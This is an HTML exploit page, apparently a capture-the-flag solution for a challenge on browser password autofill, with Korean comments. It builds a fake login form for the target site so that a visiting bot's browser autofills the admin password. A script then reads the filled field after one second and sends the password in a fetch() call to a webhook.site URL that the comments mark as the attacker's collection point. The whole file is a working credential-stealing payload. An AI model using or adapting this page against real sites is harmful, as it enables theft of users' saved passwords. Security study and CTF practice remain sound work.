<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Please wait, loading configuration...</h1>

    <!-- 1. 브라우저를 속이기 위한 더 진짜 같은 로그인 폼 -->
    <form id="login-form" action="https://autofill-web.k17.kctf.cloud/login" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" value="admin">
        <br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password">
        <br>
        <!-- 2. (핵심) 제출 버튼을 추가하여 폼을 완전하게 만듭니다. -->
        <input type="submit" value="Sign In">
    </form>

    <script>
        // (중요) 이 URL을 당신의 Webhook.site URL로 반드시 교체하세요!
        const webhookUrl = 'https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3';

        // 3. 봇이 상호작용하는 시간(1초)에 맞춰 지연 시간을 설정합니다.
        setTimeout(() => {
            const passField = document.getElementById('password');
            const stolenPassword = passField.value;

            // 자동 완성이 성공했는지 확인
            if (stolenPassword) {
                console.log("Password stolen:", stolenPassword);
                // 훔친 비밀번호를 Webhook으로 전송
                fetch(`${webhookUrl}?password=${encodeURIComponent(stolenPassword)}`);
            } else {
                console.log("Autofill failed. Password field is still empty.");
                // 디버깅을 위해 실패 메시지를 보낼 수도 있습니다.
                fetch(`${webhookUrl}?error=autofill_failed`);
            }
        }, 1000); 

    </script>
</body>
</html>
